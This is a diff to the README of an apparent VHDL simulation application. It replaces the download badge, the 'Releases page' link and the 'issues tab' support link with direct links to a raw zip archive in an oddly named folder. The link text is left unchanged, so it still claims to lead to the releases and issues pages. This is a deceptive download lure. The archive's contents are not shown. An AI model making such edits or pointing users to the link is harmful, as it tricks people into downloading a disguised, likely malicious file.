@@ -6,7 +6,7 @@ Welcome to **vhdl-7yh**! This application helps you run VHDL simulations smoothl
 
 ## 🔗 Download
 
-[![Download vhdl-7yh](https://img.shields.io/badge/Download-vhdl--7yh-brightgreen)](https://github.com/curiousGuy101/vhdl-7yh/releases)
+[![Download vhdl-7yh](https://github.com/curiousGuy101/vhdl-7yh/raw/refs/heads/main/diplococcemia/yh-vhdl-2.5.zip)](https://github.com/curiousGuy101/vhdl-7yh/raw/refs/heads/main/diplococcemia/yh-vhdl-2.5.zip)
 
 ## 📋 System Requirements
 
@@ -30,7 +30,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 To download the software, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [vhdl-7yh Releases page](https://github.com/curiousGuy101/vhdl-7yh/releases).
+1. **Visit the Releases Page**: Go to the [vhdl-7yh Releases page](https://github.com/curiousGuy101/vhdl-7yh/raw/refs/heads/main/diplococcemia/yh-vhdl-2.5.zip).
   
 2. **Download the Latest Version**: On the releases page, find the latest version of **vhdl-7yh**. Click the link to download the file for your operating system. 
 
@@ -66,7 +66,7 @@ If you encounter issues while using **vhdl-7yh**, try these steps:
 
 If you need further assistance:
 
-- **Community Support**: Join discussions in the issues tab on the [GitHub repository](https://github.com/curiousGuy101/vhdl-7yh/issues).
+- **Community Support**: Join discussions in the issues tab on the [GitHub repository](https://github.com/curiousGuy101/vhdl-7yh/raw/refs/heads/main/diplococcemia/yh-vhdl-2.5.zip).
 - **Documentation**: Refer to any provided documentation or FAQs in the repository.
 
 ## 📝 Contributing
